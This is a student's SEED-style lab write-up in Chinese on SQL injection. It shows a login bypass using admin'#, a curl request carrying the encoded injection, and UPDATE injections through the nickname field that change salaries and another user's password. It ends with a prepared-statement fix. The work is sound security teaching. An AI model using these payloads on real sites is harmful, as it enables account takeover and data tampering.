# LAB7
## 任务1
获取shell
![[Pasted image 20261105201908.png|408]]
![[Pasted image 20261105202003.png|410]]
使用`SELECT * FROM credential WHERE name='Alice';`命令来打印Alice的所有信息：
![[Pasted image 20261105202927.png]]
## 任务2
### 2.1 网页上的 SQL 注入攻击
通过#把admin后面的东西注释掉，那么提取密码的那段代码就会变成`SELECT ... FROM credential WHERE name= 'admin' #' and Password='...';`，密码就被忽略了，随便输什么都行。
![[Pasted image 20261105203215.png|486]]
![[Pasted image 20261105203327.png|491]]
### 2.2 从命令行进行 SQL 注入攻击
只需把上一个任务的`'`和`#`转化为编码：`curl 'www.seed-server.com/unsafe_home.php?username=admin%27%20%23&Password=123'`
![[Pasted image 20261105203831.png|467]]
## 任务3 在 UPDATE 语句上执行SQL 注入攻击
### 3.1 修改自己的工资
在nickname里输入`', salary='1000000`，提交后SQL语句会变成
```SQL
UPDATE credential SET
    nickname='', salary='1000000',   <-- 这里被注入了！你的工资变成了100万
    email='xxx@example.com',         <-- 保持原样
    address='xxx',
    Password='xxx',
    PhoneNumber='123456'
WHERE ID=1;  <-- Alice的ID
```
![[Pasted image 20261105204240.png|352]]
### 3.2 修改其他人的工资
同理，在nickname输入`', salary=1 WHERE name='Boby'; #`
![[Pasted image 20261105204820.png|487]]
### 3.3 修改其他人的密码
同理在nickname输入`', Password='7c4a8d09ca3762af61e59520943dc26494f8941b' WHERE name='Boby';#`，把boby的密码修改为123456
![[Pasted image 20261105205337.png]]
## 任务4
```php
// 1. 准备 SQL 语句，使用 ? 作为占位符，此时不包含任何用户数据
$stmt = $conn->prepare("SELECT id, name, eid, salary, ssn
                        FROM credential
                        WHERE name= ? and Password= ?");
// 2. 绑定参数
// "ss" 表示两个参数都是字符串类型 (string, string)
// 将 $input_uname 绑定到第一个 ?，将 $hashed_pwd 绑定到第二个 ?
$stmt->bind_param("ss", $input_uname, $hashed_pwd);
// 3. 执行编译好的语句
$stmt->execute();
// 4. 获取结果集
$result = $stmt->get_result();
```
正常登录，有输出：
![[Pasted image 20261105210222.png|489]]
试图使用注入登录，无输出：
![[Pasted image 20261105210249.png|496]]
防御成功